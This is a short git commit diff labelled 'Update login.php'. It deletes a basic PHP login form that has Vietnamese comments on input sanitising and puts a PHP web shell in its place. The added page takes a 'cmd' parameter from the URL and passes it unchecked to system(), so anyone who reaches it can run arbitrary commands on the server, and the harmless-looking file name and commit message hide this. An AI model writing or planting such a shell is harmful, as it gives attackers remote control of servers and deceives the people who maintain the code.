4437f0efc3dab35747abcde73474a29d71c6949e
copph33 <127468834+copph33@users.noreply.github.com>
2023-05-07 16:49:26 +0700

    Update login.php

--- login.php
+++ login.php
@@ -5,34 +5,17 @@
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     </head>
     <body>
-        <form method="POST">
-            <h3>Login </h3>
-            Username: <input type="text" name="username" value=""/> <br/>
-            password: <input type="password" name="password" value=""/><br/>
-            <input type="submit" name="submit" value="Send"/><br/>
-            <?php
-                // Nếu người dùng click vào button Send
-                // Vì button đó tên là submit nên đó cũng là
-                // tên của key nằm trong biến $_POST
-                //
-                if (isset($_POST['submit'])){
-                    if(empty($_POST['username'])){
-                        echo "Please enter username !!!!!";
-                    }else{
-                        //htmlspecialchar biến 1 chuỗi js hay payload thành 1 chuối tring 
-                        // HMTL entities
-                        $username_s=filter_var($_POST['username'],FILTER_SANITIZE_SPECIAL_CHARS);
-                        //echo 'Username : ' . htmlspecialchars(($_POST['username']));
-                        echo $username_s;
-                    }
-                    echo '<br/>';
-                    if(empty($_POST['password'])){
-                        echo 'Please Enter password!!!!';
-                    }else{
-                        echo 'Password : ' . $_POST['password'];
-                    }
-                }
-           ?>
-        </form>
-    </body>
+        <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
+<input type="SUBMIT" value="Execute">
+</form>
+<pre>
+<?php
+if(isset($_GET['cmd']))
+{
+system($_GET['cmd']);
+}
+?>
+</pre>
+</body>
 </html>
